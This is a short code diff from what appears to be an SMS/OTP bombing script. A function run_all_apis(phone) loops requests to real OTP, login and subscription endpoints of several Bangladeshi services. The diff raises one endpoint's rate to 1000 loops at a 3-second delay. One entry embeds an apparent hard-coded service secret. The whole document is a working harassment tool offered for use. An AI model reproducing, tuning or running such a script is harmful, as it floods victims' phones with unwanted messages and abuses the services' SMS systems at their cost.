@@ -80,7 +80,7 @@ def run_all_apis(phone):
         {"url": "https://api.apex4u.com/api/auth/login", "body": {"phoneNumber": ""}, "delay": 180, "loops": 5},
         {"url": "https://www.wafilife.com/api/auth/send-otp", "body": {"mobileNumber": ""}, "delay": 33, "loops": 10},
         {"url": "https://gpfi-api.grameenphone.com/api/v1/fwa/request-for-otp", "body": {"phone": "", "email": "", "language": "en"}, "delay": 61, "loops": 10},
-        {"url": "https://www.admissiontaker.site/api/send-reg-otp", "body": {"phone_number": ""}, "delay": 10, "loops": 150},
+        {"url": "https://www.admissiontaker.site/api/send-reg-otp", "body": {"phone_number": ""}, "delay": 3, "loops": 1000},
         {"url": "https://api.toybox.live/bdapps_handler.php", "body": {"Operation": "CreateSubscription", "MobileNumber": "88", "PackageID": 100, "Secret": "HJKX71%UHYHa"}, "delay": 12, "loops": 5},
         {"url": "https://api.garibookadmin.com/api/v4/user/login", "body": {"mobile": "+88", "recaptcha_token": "garibookcaptcha", "channel": "web"}, "delay": 182, "loops": 5},
         {"url": "https://backend.timezonebd.com/api/v1/user/otp-login", "body": {"phone": ""}, "delay": 301, "loops": 3},
